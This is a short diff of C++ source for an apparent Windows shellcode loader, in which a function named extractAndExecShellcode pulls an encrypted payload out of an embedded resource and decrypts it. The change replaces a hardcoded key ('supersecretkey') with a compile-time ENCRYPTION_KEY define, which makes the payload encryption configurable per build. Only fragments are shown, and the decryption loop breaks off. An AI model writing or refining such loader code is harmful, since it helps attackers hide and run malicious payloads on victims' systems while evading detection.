@@ -11,6 +11,10 @@
 #error "RESOURCE_NAME is not defined. Please define it during compilation."
 #endif
 
+#ifndef ENCRYPTION_KEY
+#error "ENCRYPTION_KEY is not defined. Please define it during compilation."
+#endif
+
 void extractAndExecShellcode(HMODULE hModule){
     LPCWSTR resourceName = RESOURCE_NAME;
     LPCWSTR resourceType = reinterpret_cast<LPCWSTR>(RT_RCDATA);
@@ -45,7 +49,7 @@ void extractAndExecShellcode(HMODULE hModule){
 
     LPBYTE enc_shellcode = (LPBYTE)pResData + (resSize - SHELLCODE_LEN);
 
-    LPCSTR key = "supersecretkey";
+    LPCSTR key = ENCRYPTION_KEY;
     BYTE shellcode[SHELLCODE_LEN];
 
     for(SIZE_T i = 0; i < SHELLCODE_LEN; i++){
